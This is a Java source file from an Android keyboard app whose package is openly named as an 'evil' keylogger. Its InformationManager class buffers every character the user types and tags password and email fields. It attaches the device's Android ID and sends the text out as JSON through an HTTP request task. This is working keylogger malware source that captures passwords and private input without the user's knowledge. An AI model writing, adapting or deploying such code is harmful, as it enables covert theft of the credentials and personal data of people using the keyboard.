package com.example.keyboard_keylogger.evil;

import android.inputmethodservice.InputMethodService;
import android.provider.Settings;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;

public class InformationManager {
    private final ArrayList<Character> text;
    private final String androidId;
    private String inputType;


    public InformationManager(@NonNull InputMethodService ime){
        this.text = new ArrayList<>();
        this.androidId = Settings.Secure.getString(ime.getContentResolver(), Settings.Secure.ANDROID_ID);
    }
    /**
     * Gets information about IME service passed as an argument
     * @param text ArrayList<Character> of text
     * @param androidId Unique ID for the user
     * @param inputType Input Type like password, text, email, number...
     * @return JSONObject
     */
    @NonNull
    private JSONObject createJSONObject(ArrayList<Character> text, String inputType, String androidId) {
        String inputText = getStringRepresentation(text);

        JSONObject infoObject= new JSONObject();
        try {
            infoObject.put("text",inputText);
            infoObject.put("inputType",inputType);
            infoObject.put("id",androidId);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return infoObject;

    }

    public void addInputTypeFromIME(@NonNull InputMethodService ime){
        this.inputType = determineInputType(ime.getCurrentInputEditorInfo().inputType);
    }
    public void addChar(char c){
        text.add(c);
    }
    public void sendInfo(){

        JSONObject infoObject = createJSONObject(text,inputType,androidId);
        new HTTPReqTask().setBody(infoObject.toString()).execute();
        text.clear();
    }

    @NonNull
    private String getStringRepresentation(@NonNull ArrayList<Character> list) {
        StringBuilder builder = new StringBuilder(list.size());
        for(Character ch: list)
        {
            builder.append(ch);
        }
        return builder.toString();
    }
    @NonNull
    private String determineInputType(int inputType){
        if (InputTypeUtils.isPasswordInputType(inputType) || InputTypeUtils.isVisiblePasswordInputType(inputType)) return "Password";
        if (InputTypeUtils.isEmailVariation(inputType)) return "Email";
        return "Text";
    }
}
